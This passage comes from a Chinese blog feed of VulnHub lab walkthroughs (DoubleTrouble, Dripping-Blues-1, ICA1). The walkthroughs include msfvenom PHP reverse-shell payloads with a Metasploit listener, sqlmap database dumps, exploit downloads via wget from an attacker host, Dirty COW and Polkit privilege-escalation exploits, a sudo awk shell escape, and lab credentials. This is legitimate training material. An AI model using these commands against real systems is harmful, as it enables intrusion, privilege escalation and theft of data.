class="line">searchsploit qdpm</span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>我们发现密码泄露漏洞是50176.txt，查看，发现我们可以去<code>http://&lt;website&gt;/core/config/databases.yml</code> 这个目录下，获得数据库的用户名密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m <span class="number">50176.</span>txt <span class="comment">#将50176.txt存到当前目录</span></span><br><span class="line">cat <span class="number">50176.</span>txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%203.png" alt="Untitled"></p><p>访问后，得到用户名：密码— <code>otis</code> :<code>rush</code></p><p><img src="Untitled%204.png" alt="Untitled"></p><p>但我们发现，靶机的3306端口并没有开，继续信息搜集</p><p>使用dirsearch爆破目录，得到如下目录，发现secret目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.138/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>访问<code>/secret</code>目录里面都有一个<code>doubletrouble.jpg</code></p><p><img src="Untitled%206.png" alt="Untitled"></p><p>打开图片，发现图片里有我们刚刚获取的用户名和密码Otis：Rush</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>但目前这些信息并没有什么用，因此想到了以前做CTF时候的隐写术，丢到WinHex里并没有发现什么东西，我们搜索jpg相关的隐写术，发现有一种steghide隐写，可以在linux中使用。</p><blockquote><p>Steghide 是一个可用于隐写术的工具。它允许您在音频和图像文件中嵌入秘密信息，包括 JPEG、BMP、WAV 和 AU 文件。 Steghide 允许：</p><ul><li>嵌入数据的加密。</li><li>嵌入数据的压缩。</li><li>嵌入校验和以验证提取的数据的完整性。</li></ul></blockquote><p>我们安装一下，并试一下，发现需要密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install steghide <span class="comment">#安装</span></span><br><span class="line">steghide info doubletrouble.jpg <span class="comment">#查看图片信息</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p>然后StegHide是隐写工具，现在我们是要破解它隐写后的密码，这里用到了另一个工具：<strong>Stegseek</strong></p><blockquote><p>Stegseek是迄今为止全世界最快的Steghide破解qi，该工具每秒能够处理数百万的密码。虽然Stegseek是一款轻量级工具，但丝毫不影响其功能性的强大。该工具作为原始Steghide项目的一个分支而构建，它的速度比其他破解qi快上千倍。在该工具的帮助下，广大研究人员可以轻松从使用了Steghide隐写&amp;加密的文件中提取出隐藏的数据。</p><p>除此之外，Stegseek还可以用来提取Steghide的元数据，我们可以利用这些信息来判断一个文件中是否包含了Steghide数据。</p><p>值得一提的是，仅需两秒钟，该工具就可以跑完rockyou.txt字典。而众所周知，rockyou.txt是一个包含了超过1400万个密码的强大字典文件。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install stegseek</span><br></pre></td></tr></table></figure><p>然后我们使用<code>/usr/share/wordlist/rockyou.txt.gz</code> 解压后的<code>rockyou.txt</code>来进行暴力破解</p><p>得到密码<code>92camaro</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek doubletrouble.jpg rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%209.png" alt="Untitled"></p><p>再次查看图片信息，输入密码，发现有一个<code>creds.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info doubletrouble.jpg</span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>分离文件，输入密码，得到<code>creds.txt</code> 查看一下，得到邮箱：密码<code>otisrush@localhost.com:otis666</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf doubletrouble.jpg</span><br><span class="line">cat creds.txt</span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>登录成功</p><p><img src="Untitled%2012.png" alt="Untitled"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们发现可以上传文件</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>我们使用msf生成一个php反弹木马，上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>上传成功</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>我们使用msf进行监听,设置<code>options</code>与生成的木马一一对应</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>然后我们刚刚扫描的时候，发现有一个<code>uploads</code>目录，我们访问一下其下的目录<code>attachments</code></p><p>发现我们刚上传的文件已经上传成功了</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>我们在攻击机输入<code>run</code>开启监听</p><p><img src="Untitled%2017.png" alt="Untitled"></p><p>访问php文件，反弹成功</p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>现在的权限是网站权限</p><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h2><p>使用<code>py</code>获取交互式<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>使用命令查看带有<code>SUID</code>权限的文件，发现并没有什么东西</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2021.png" alt="Untitled"></p><p>使用命令查看可以使用<code>root</code>权限执行的命令，发现<code>awk</code>命令可以以<code>root</code>权限执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="Untitled%2022.png" alt="Untitled"></p><p>因此我们可以借助<code>awk</code>进行<code>sudo</code>提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>关于<code>sudo</code>提权可以看我之前的文章<a href="https://jo4hua.github.io/2023/03/05/sudo%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83/">sudo滥用提权 | Don_Joshua’s Blog (jo4hua.github.io)</a></p><p>提权成功</p><p><img src="Untitled%2023.png" alt="Untitled"></p><p>进入到root目录……发现……还有一个靶机，将其移动到<code>/var/www/html</code>目录下</p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>输入网址+镜像名，下载，开机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.138</span>/doubletrouble.ova</span><br></pre></td></tr></table></figure><h1 id="第二层靶机"><a href="#第二层靶机" class="headerlink" title="第二层靶机"></a>第二层靶机</h1><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>依旧使用nmap找到存活主机</p><p><img src="Untitled%2025.png" alt="Untitled"></p><p>访问80端口web服务，是一个登录页面</p><p><img src="Untitled%2026.png" alt="Untitled"></p><p>使用之前的<code>otis</code>用户名和密码，登陆失败，没有回显，可能是sql注入？使用<code>sqlmap</code>尝试一下吧</p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>首先查看源代码，用的是<code>pos</code>t方式传<code>uname,psw</code></p><p><img src="Untitled%2027.png" alt="Untitled"></p><p>使用sqlmap，存在时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2028.png" alt="Untitled"></p><p>使用命令，得到数据库<code>doubletrouble</code> 另一个是默认表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2029.png" alt="Untitled"></p><p>继续爆破表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble --tables --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2030.png" alt="Untitled"></p><p>爆破字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2031.png" alt="Untitled"></p><p>爆破内容，得到用户名密码<code>montreux | GfsZxc1</code>   <code>clapton  | ZubZub99</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span>/index.php --data=<span class="string">&quot;uname=admin&amp;psw=123&quot;</span> -D doubletrouble -T users -C username,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="Untitled%2032.png" alt="Untitled"></p><p>然后我们登录，发现登录不上，那现在只剩一个地方了</p><p>没错就是<code>ssh</code>了，使用第二个用户和密码登陆成功，获得普通用户权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh clapton@<span class="number">192.168</span><span class="number">.0</span><span class="number">.139</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2033.png" alt="Untitled"></p><h2 id="权限提升：-1"><a href="#权限提升：-1" class="headerlink" title="权限提升："></a>权限提升：</h2><p>老套路，先查看具有SUID权限的文件,发现一个exim4有些可疑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2034.png" alt="Untitled"></p><p>搜一下，发现可以进行SUID提权，使用命令查看一下版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/exim4 --version</span><br></pre></td></tr></table></figure><p><img src="Untitled%2035.png" alt="Untitled"></p><p>寻找对应版本漏洞，下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Exim <span class="number">4.80</span></span><br><span class="line">searchsploit -m <span class="number">35951.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2036.png" alt="Untitled"></p><p>开启apache服务，将exp移动到/var/www/html目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">mv <span class="number">35951.</span>py /var/www/html</span><br></pre></td></tr></table></figure><p><img src="Untitled%2037.png" alt="Untitled"></p><p>使用靶机下载exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">35951.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2038.png" alt="Untitled"></p><p>发现这几个exp都不好用</p><p>接下来查看系统内核信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p><img src="Untitled%2039.png" alt="Untitled"></p><p>直接上脏牛提权吧，发现我们的内核版本在可利用范围内</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchspolit dirty</span><br></pre></td></tr></table></figure><p><img src="Untitled%2040.png" alt="Untitled"></p><p>重复上述过程，我们将<code>40847.cpp</code>上传到靶机上，赋予执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">40847.</span>cpp <span class="comment">#靶机下载exp</span></span><br><span class="line"></span><br><span class="line">chmod +x <span class="number">40847.</span>cpp <span class="comment">#赋予运行权限</span></span><br><span class="line"></span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++<span class="number">11</span> -pthread -o <span class="number">1</span> <span class="number">40847.</span>cpp -lutil <span class="comment">#编译一下，输出为1</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2041.png" alt="Untitled"></p><p>运行1，得到root密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./<span class="number">1</span> 运行</span><br></pre></td></tr></table></figure><p><img src="Untitled%2042.png" alt="Untitled"></p><p>使用<code>su</code>切换为<code>root</code>用户，输入密码，获取<code>root</code>权限</p><p><img src="Untitled%2043.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p>获取普通权限的时候，发现<code>user.txt</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure><p>在<code>root</code>目录下<code>cat root.txt</code>可得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』Dripping-Blues-1</title>
      <link href="/2024/05/22/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDripping-Blues-1/"/>
      <url>/2024/05/22/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FDripping-Blues-1/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』Dripping-Blues-1"><a href="#『vulnhub系列』Dripping-Blues-1" class="headerlink" title="『vulnhub系列』Dripping-Blues-1"></a>『vulnhub系列』Dripping-Blues-1</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dripping-blues-<span class="number">1</span>,<span class="number">744</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap进行本地扫描，确定Ip地址为137</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口web服务，有一串文字，意思大概是被攻击了，然后开了个小玩笑</p><p>这个名字可能会有用<code>travisscott &amp; thugger</code> </p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录，只发现<code>robots.txt</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.137/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问<code>robots.txt</code> 发现有一个<code>/dripisreal.txt</code> 和<code>/etc/dripispowerful.html</code> ，我们试着访问一下</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>发现是让我们访问一个歌词网站，并计算其中的“n words”的MD5值，这个值是ssh登录的密码</p><p><img src="Untitled%204.png" alt="Untitled"></p><p><img src="Untitled%205.png" alt="Untitled"></p><p>自己试了一下，我们使用py生成md5值，发现并不行，应该是猜错了，我们继续从别的地方入手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">67aff0e8f24f431a9f31899e0c18839b</span><br></pre></td></tr></table></figure><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>因为开启了ftp服务，我们可以使用匿名登录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：anonymous</span><br><span class="line">ftp <span class="number">192.168</span><span class="number">.0</span><span class="number">.137</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%206.png" alt="Untitled"></p><p>发现有一个<code>respectmydrip.zip</code> 文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="comment">#查看当前目录文件</span></span><br><span class="line">get respectmydrip.<span class="built_in">zip</span> <span class="comment">#下载文件</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>解压，发现需要密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p>我们可以使用<code>/usr/share/wordist/rockyou.txt.gz</code> 里的字典进行暴力破解</p><p>首先使用<code>gzip -d rockyou.txt.gz</code> 对其进行解压</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>然后我们使用工具<code>fcrackzip</code>来进行暴力破解,得到了密码<code>072528035</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装：apt-get install fcrackzip</span><br><span class="line">命令：fcrackzip -D -p rockyou.txt -u respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>之后我们进行解压，解压出来两个文件：<code>respectmydrip.txt</code> 和 <code>secret.zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip respectmydrip.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>我们查看一下<code>respectmydrip.txt</code>  文件，获得提示：<code>just focus on &quot;drip”</code></p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>解压一下<code>secret.zip</code> ，发现也有密码，并且没有破解出来</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>我们回到网页，提示说注意“<code>drip</code>”，并且在<code>robots</code>中还有一个<code>/etc</code>下的文件，可能存在任意文件读取操作，尝试一下，成功。得到，密码：<code>imdrippinbiatch</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.137</span>/index.php?drip=/etc/dripispowerful.html</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>解压<code>secret.zip</code>试试，不对</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>那我们想想还有什么地方需要用到密码：没错<code>ssh</code></p><p>使用留言的这两个id：<code>travisscott &amp; thugger</code> 配上密码登录一下试试，成功</p><p><img src="Untitled%2016.png" alt="Untitled"></p><h2 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h2><p><code>ls</code>一下可以看到<code>user.txt</code> ，然后<code>cat</code>一下获得以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5C50FC503A2ABE93B4C5EE3425496521</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查看可以具有SUID权限的文件，我们发现有一个<code>/usr/lib/policykit-1/polkit-agent-helper-1</code></p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>这里需要用到github上的Poc<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p>然后将<code>CVE-2021-3560.py</code> 传到靶机，使用命令，获得Root权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">3560.</span>py</span><br></pre></td></tr></table></figure><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p>除了一开始获得的user.txt我们来到root里获得root.txt </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">78CE377EF7F10FF0EDCA63DD60EE63B8</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』ICA1</title>
      <link href="/2024/05/20/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FICA%201/"/>
      <url>/2024/05/20/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FICA%201/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』ICA1"><a href="#『vulnhub系列』ICA1" class="headerlink" title="『vulnhub系列』ICA1"></a>『vulnhub系列』ICA1</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://download.vulnhub.com/ica/ica1.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>如果靶机获取不了IP地址请看这里：<a href="https://jo4hua.github.io/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/">『vulnhub系列』JANGOW | Don_Joshua’s Blog (jo4hua.github.io)</a></p><p>使用命令<code>nmap 192.168.0.130</code> 找到存活主机</p><p><img src="Untitled.png" alt="Untitled"></p><p>开启了ssh,http,mysql服务，先访问80端口，进入如下登录界面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.136/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>发现数据库配置界面</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>使用<code>searchsploit qdPM 9.2</code> 发现如下漏洞</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>一个是csrf现在我们还没到那一步，第二个是密码泄露，我们使用</p><p><code>searchsploit -m 50176.txt</code> 将50176移到当前目录下，使用<code>cat 50176.txt</code>查看</p><p><img src="Untitled%205.png" alt="Untitled"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发现访问<code>http://&lt;website&gt;/core/config/databases.yml</code> 网站的这个链接，即可以看到数据库的用户名和密码 ，成功（<code>qdpmadmin:UcVQCMQk2STVeS6J</code>）</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>尝试登录一下</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>成功，记住这个邮箱，并设置密码（<code>admin@localhost.com:admin</code>）</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>回到主页面，使用刚刚的邮箱登录</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>发现登录失败，但是通过修改密码我们可以发现，邮箱是对的。</p><p>我们使用mysql登录，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">192.168</span><span class="number">.0</span><span class="number">.136</span> -u qdpmadmin -p</span><br><span class="line">---然后输入密码</span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>通过上面的配置文件，我们可以知道数据库的名字是<code>qdpm</code> ，<code>use qdpm</code> ，<code>show tables</code> 查看这个数据库里的表，我们发现<code>users</code>表</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p><code>show columns from users</code> 查看字段名</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>果然是password，现在我们查询一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password <span class="keyword">from</span> users where email=<span class="string">&quot;admin@localhost.com&quot;</span></span><br></pre></td></tr></table></figure><p>结果高兴的有些早了，我们发现查询数据为空…….，应该直接看有没有数据的</p><p><img src="Untitled%2014.png" alt="Untitled"></p><p>直接一个一个查看每一个表，最后在<code>configuration</code>中找到我们需要的东西</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>但是<code>$P$E0dY11qb93cBPO/VuVULOQPHeuLb6m/</code> 是一段hash值，很像是crypt中的，但判断不出来。</p><p>在安装工具<code>hash-identifier</code> 之后，我们使用<code>hash-identifier</code> 进行判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/blackploit/<span class="built_in">hash</span>-identifier.git</span><br><span class="line">cd /<span class="built_in">hash</span>-identifier</span><br><span class="line">python <span class="built_in">hash</span>-<span class="built_in">id</span>.py</span><br></pre></td></tr></table></figure><p>输入对应的hash值之后，我们可以得到类型可能是md5</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>我们使用本机生成一个md5的hash然后覆盖掉原来的hash，这里使用python生成一个密码为<code>admin</code>的hash值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line">crypt.crypt(<span class="string">&#x27;admin&#x27;</span>, crypt.mksalt(crypt.METHOD_MD5))</span><br><span class="line">------结果</span><br><span class="line">$<span class="number">1</span>$aFzipe0r$qYbks7esarcBVgfO0.oay1</span><br></pre></td></tr></table></figure><p>修改app_administrator_password（id=2）的value，成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update configuration <span class="built_in">set</span> value=<span class="string">&#x27;$1$aFzipe0r$qYbks7esarcBVgfO0.oay1&#x27;</span> where <span class="built_in">id</span>=<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>登录试试，成功</p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>此时，我们添加用户</p><p><img src="Untitled%2019.png" alt="Untitled"></p><p>发现可以上传文件</p><p><img src="Untitled%2020.png" alt="Untitled"></p><p>上传看一下，报错</p><p><a href="https://www.notion.so">https://www.notion.so</a></p><p>但是我们一开始是有一个<code>/uploads</code>文件夹,发现文件已经上传成功了</p><p><img src="Untitled%2021.png" alt="Untitled"></p><p>此时我们上传一个php一句话木马试试</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>发现并没有这个文件</p><p><img src="Untitled%2023.png" 